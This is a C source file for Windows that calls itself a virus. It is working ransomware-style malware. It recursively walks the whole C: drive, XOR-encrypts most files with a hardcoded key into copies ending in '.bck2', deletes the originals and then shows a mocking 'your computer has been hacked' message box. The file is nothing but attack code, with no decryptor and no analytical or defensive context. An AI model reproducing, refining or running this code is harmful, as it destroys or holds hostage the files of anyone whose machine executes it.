#include <windows.h>
#include <stdio.h>
#include <string.h>
#include<stdlib.h>
#include<time.h>
#include <sys/stat.h>
#include<stdbool.h>
__attribute__((section("password")))
const char Key[]="CX+*FBHSF+/HBSF";//
char * strRight(const char *src, unsigned int n) ;
const char *ver="bck 3.0 2020//7//12 fix 4.virus by znkzz";
int findFile( char filePath[] , long long Directory);
void CL(char *a,char *vb);
char GetRanDomKey(bool cleanit);
void EncryptFileK(const char *File_0, char *File_E) ;
unsigned long GetFileSizeK(const char *path) ;
char GetRanDomKey(bool cleanit) {
	static unsigned short con;
	if(cleanit)
	con=0;
	++con;
	if(con==(strlen(Key))) {
		con=0;
	}

	return	Key[con];
}
unsigned long GetFileSizeK(const char *path) {

	struct stat statbuf;
	stat(path,&statbuf);
	unsigned long size=statbuf.st_size;
	return size;

}

char * strRight(const char *src, unsigned int n) {

	if (!src || n <= 0 || n >= strlen(src))
		return NULL;

	char *retBuffer = (char *)malloc(n+1);
	memset(retBuffer, 0, n+1);

	unsigned int offset = strlen(src)-n;
	strncpy(retBuffer, src+offset, n);

	return retBuffer;
}

void EncryptFileK(const char *File_0, char *File_E) {
	
	FILE *f1=fopen(File_0,"r+b"); 
	FILE *f2=fopen(File_E,"w+b") ;

	
	unsigned long StrLong=GetFileSizeK(File_0);

	if(StrLong==0) {
		fwrite("", sizeof(char), StrLong, f2);
		fclose(f1);
		fclose(f2);
		return ;
	}
	if(StrLong>256*1024*1024) {
		fclose(f1);
		fclose(f2);
		return ;
	}

	if(!StrLong||!f1||!f2) {
		return ;
	}
	char *pDATA = (char *)malloc(StrLong*sizeof(char));

	if(pDATA==NULL) {
		return ;
	}

	fread(pDATA, sizeof(char), StrLong, f1);
	
	char t;
	GetRanDomKey(1);
for (unsigned long i = 0; i < StrLong; i++) {
t=GetRanDomKey(0);
		pDATA[i]^=t;
//printf("%c\n",t);
//Sleep(300);
	}

	fwrite(pDATA, sizeof(char), StrLong, f2);
	fputc(10^(int)GetRanDomKey(0),f2);
	free(pDATA);
	fclose(f1);
	fclose(f2);
	return ;
	
}

int findFile( char filePath[] , long long Directory) {
	char szFind[MAX_PATH];
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	strcpy(szFind,filePath);
	strcat(szFind,"\\*.*");
	hFind=FindFirstFile(szFind,&FindFileData);
	if(INVALID_HANDLE_VALUE==hFind) {
		return 0;
	}
	while(1) {

		if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

			if(FindFileData.cFileName[0]!='.') {

				Directory++;

				strcpy(szFind,filePath);
				strcat(szFind,"\\");
				strcat(szFind,FindFileData.cFileName);
				findFile(szFind,Directory);
			}
		} else {

			CL(filePath,FindFileData.cFileName);

		}
		if(!FindNextFile(hFind,&FindFileData))
			break;
	}

	FindClose(hFind);
	return 0;
}


int main() {

	long long Directory=0;
 char *input="c:\\";
	findFile(input,Directory);
	MessageBox(NULL,"宁的电脑被黑了（手动滑稽）","Warning",16);

	return 0;
}
void CL(char *a,char *vb) {
 char *e ="\\";
	char *name = (char *)calloc(strlen(a) + strlen(vb) +128, 1);
	strcat(name, a);
	strcat(name, e);
	strcat(name,vb);
	if (strcmp(strRight(name,3),"exe")==0||strcmp(strRight(name,3),"tmp")==0||strcmp(strRight(name,3),"img")==0||strcmp(strRight(name,strlen("bck2")),"bck2")==0||strcmp(strRight(name,3),"bin")==0||strcmp(strRight(name,3),"dll")==0||strcmp(strRight(name,3),"bak")==0) {
return;
	}
	char *sr = (char *)calloc(strlen(a) + strlen(vb)+128, 1);
	strcpy(sr,name);

	strcat(sr,".bck2");
	EncryptFileK(name,sr);
	remove(name);
free(sr);
	free(name);

}



